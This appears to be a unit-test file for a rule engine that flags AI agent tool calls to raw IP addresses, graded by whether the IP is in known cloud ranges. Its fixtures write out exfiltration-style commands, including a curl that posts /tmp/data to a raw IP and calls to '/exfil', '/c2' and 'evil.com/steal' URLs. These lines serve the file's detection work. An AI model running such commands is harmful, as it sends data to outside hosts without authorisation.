/**
 * Unexpected network destination rule unit tests.
 *
 * Covers two rules:
 *   RULE_OUTBOUND_KNOWN_IP   -- raw IP within a known cloud CIDR (MEDIUM)
 *   RULE_OUTBOUND_UNKNOWN_IP -- raw IP outside all known CIDRs (HIGH)
 *
 * Also unit-tests the CIDR helper and IP extractor directly.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { RuleEngine } from "../../dist/engine.js";
import {
  RULE_OUTBOUND_KNOWN_IP,
  RULE_OUTBOUND_UNKNOWN_IP,
} from "../../dist/rules/index.js";
import { isInKnownCidrs, extractRawIps } from "../../dist/conditions/index.js";

function makeEvent(toolName, mcpServer, parameters) {
  return {
    schema_version: 1,
    event_id: "evt-1",
    session_id: "sess-test",
    occurred_at: "2026-05-01T00:00:00.000Z",
    recorded_at: "2026-05-01T00:00:00.000Z",
    interceptor: "mock",
    event_type: "tool.invoked",
    tool_call_id: "tc-1",
    tool_name: toolName,
    mcp_server: mcpServer,
    parameters,
  };
}

function makeFetch(url) {
  return makeEvent("mcp__http__fetch", "http", { url });
}

function makeBash(command) {
  return makeEvent("bash", "builtin", { command });
}

// ---------------------------------------------------------------------------
// CIDR helper unit tests (isInKnownCidrs)
// ---------------------------------------------------------------------------

const TEST_CIDRS = ["52.0.0.0/8", "34.64.0.0/10", "1.1.1.0/24"];

test("isInKnownCidrs: IP inside /8 block matches", () => {
  assert.ok(isInKnownCidrs("52.100.200.1", TEST_CIDRS));
});

test("isInKnownCidrs: IP outside /8 block does not match", () => {
  assert.ok(!isInKnownCidrs("53.0.0.1", TEST_CIDRS));
});

test("isInKnownCidrs: IP on boundary of /24 matches", () => {
  assert.ok(isInKnownCidrs("1.1.1.1", TEST_CIDRS));
  assert.ok(isInKnownCidrs("1.1.1.254", TEST_CIDRS));
});

test("isInKnownCidrs: IP outside /24 boundary does not match", () => {
  assert.ok(!isInKnownCidrs("1.1.2.1", TEST_CIDRS));
});

test("isInKnownCidrs: /10 block correctly scopes", () => {
  // 34.64.0.0/10 covers 34.64.0.0 - 34.127.255.255
  assert.ok(isInKnownCidrs("34.64.0.1", TEST_CIDRS));
  assert.ok(isInKnownCidrs("34.127.255.255", TEST_CIDRS));
  assert.ok(!isInKnownCidrs("34.128.0.0", TEST_CIDRS));
  assert.ok(!isInKnownCidrs("34.63.255.255", TEST_CIDRS));
});

// ---------------------------------------------------------------------------
// IP extraction unit tests (extractRawIps)
// ---------------------------------------------------------------------------

test("extractRawIps: extracts IP from URL parameter", () => {
  const event = makeFetch("http://52.24.10.1/api/data");
  const ips = extractRawIps(event);
  assert.ok(ips.includes("52.24.10.1"), JSON.stringify(ips));
});

test("extractRawIps: extracts IP from curl bash command", () => {
  const event = makeBash("curl http://10.0.0.5:8080/exfil -d @/tmp/data");
  const ips = extractRawIps(event);
  assert.ok(ips.includes("10.0.0.5"), JSON.stringify(ips));
});

test("extractRawIps: skips localhost and 0.0.0.0", () => {
  const event = makeFetch("http://127.0.0.1:3000/health");
  assert.deepEqual(extractRawIps(event), []);
});

test("extractRawIps: deduplicates repeated IPs", () => {
  const event = makeEvent("bash", "builtin", {
    command: "curl http://52.24.10.1/a && curl http://52.24.10.1/b",
  });
  const ips = extractRawIps(event);
  assert.equal(ips.filter((ip) => ip === "52.24.10.1").length, 1);
});

// ---------------------------------------------------------------------------
// RULE_OUTBOUND_KNOWN_IP (MEDIUM)
// ---------------------------------------------------------------------------

const knownEngine = new RuleEngine([RULE_OUTBOUND_KNOWN_IP]);

// IPs that fall in the KNOWN_CLOUD_CIDRS embedded in the rule.
const KNOWN_IP_CASES = [
  ["AWS 52.x",        makeFetch("https://52.100.200.1/api")],
  ["AWS 54.x",        makeFetch("https://54.88.100.1/endpoint")],
  ["AWS 18.x",        makeFetch("https://18.214.1.1/")],
  ["GCP 35.x",        makeFetch("https://35.190.1.1/")],
  ["Azure 20.x",      makeFetch("https://20.100.50.1/data")],
  ["Cloudflare 1.1.1.x", makeFetch("https://1.1.1.1/dns-query")],
  ["Fastly 151.x",    makeFetch("https://151.101.1.1/asset")],
  ["AWS via curl",    makeBash("curl http://52.10.10.10/exfil")],
];

for (const [desc, event] of KNOWN_IP_CASES) {
  test(`RULE_OUTBOUND_KNOWN_IP fires for ${desc}`, () => {
    const findings = knownEngine.evaluate(event);
    assert.ok(findings.length >= 1, `expected >= 1 finding for ${desc}, got ${findings.length}`);
    assert.equal(findings[0].severity, "MEDIUM");
    assert.equal(findings[0].category, "unexpected_network_destination");
    assert.ok(
      findings[0].description.includes("cloud provider"),
      `description should mention cloud provider: ${findings[0].description}`
    );
  });
}

test("RULE_OUTBOUND_KNOWN_IP does not fire for hostname-based URLs", () => {
  assert.equal(knownEngine.evaluate(makeFetch("https://api.example.com/data")).length, 0);
});

test("RULE_OUTBOUND_KNOWN_IP does not fire for unknown IPs", () => {
  // 10.x.x.x private range is not in known CIDRs
  assert.equal(knownEngine.evaluate(makeFetch("https://10.20.30.40/data")).length, 0);
});

// ---------------------------------------------------------------------------
// RULE_OUTBOUND_UNKNOWN_IP (HIGH)
// ---------------------------------------------------------------------------

const unknownEngine = new RuleEngine([RULE_OUTBOUND_UNKNOWN_IP]);

const UNKNOWN_IP_CASES = [
  ["private 10.x",    makeFetch("http://10.20.30.40/exfil")],
  ["private 192.168.x (non-gateway)", makeFetch("http://192.168.1.100/data")],
  ["arbitrary public", makeFetch("http://185.220.101.1/callback")],  // Tor exit nodes, not in CDN
  ["arbitrary public 2", makeBash("curl http://45.33.32.156/c2")],
];

for (const [desc, event] of UNKNOWN_IP_CASES) {
  test(`RULE_OUTBOUND_UNKNOWN_IP fires for ${desc}`, () => {
    const findings = unknownEngine.evaluate(event);
    assert.ok(findings.length >= 1, `expected >= 1 finding for ${desc}`);
    assert.equal(findings[0].severity, "HIGH");
    assert.equal(findings[0].category, "unexpected_network_destination");
    assert.ok(
      findings[0].description.includes("unknown host"),
      `description should mention unknown host: ${findings[0].description}`
    );
  });
}

test("RULE_OUTBOUND_UNKNOWN_IP does not fire for known cloud IPs", () => {
  // 52.x.x.x is in AWS range
  assert.equal(unknownEngine.evaluate(makeFetch("https://52.100.200.1/api")).length, 0);
});

test("RULE_OUTBOUND_UNKNOWN_IP does not fire for hostname-based URLs", () => {
  assert.equal(unknownEngine.evaluate(makeFetch("https://evil.com/steal")).length, 0);
});

test("RULE_OUTBOUND_UNKNOWN_IP does not fire for localhost", () => {
  assert.equal(unknownEngine.evaluate(makeFetch("http://127.0.0.1:3000/")).length, 0);
});

// ---------------------------------------------------------------------------
// Both rules together: each IP fires exactly one rule, not both
// ---------------------------------------------------------------------------

const bothEngine = new RuleEngine([RULE_OUTBOUND_KNOWN_IP, RULE_OUTBOUND_UNKNOWN_IP]);

test("Known IP fires MEDIUM only (not HIGH)", () => {
  const findings = bothEngine.evaluate(makeFetch("https://52.100.200.1/api"));
  const severities = findings.map((f) => f.severity);
  assert.ok(severities.includes("MEDIUM"), "expected MEDIUM finding");
  assert.ok(!severities.includes("HIGH"), "should not produce HIGH for known IP");
});

test("Unknown IP fires HIGH only (not MEDIUM)", () => {
  const findings = bothEngine.evaluate(makeFetch("http://185.220.101.1/callback"));
  const severities = findings.map((f) => f.severity);
  assert.ok(severities.includes("HIGH"), "expected HIGH finding");
  assert.ok(!severities.includes("MEDIUM"), "should not produce MEDIUM for unknown IP");
});
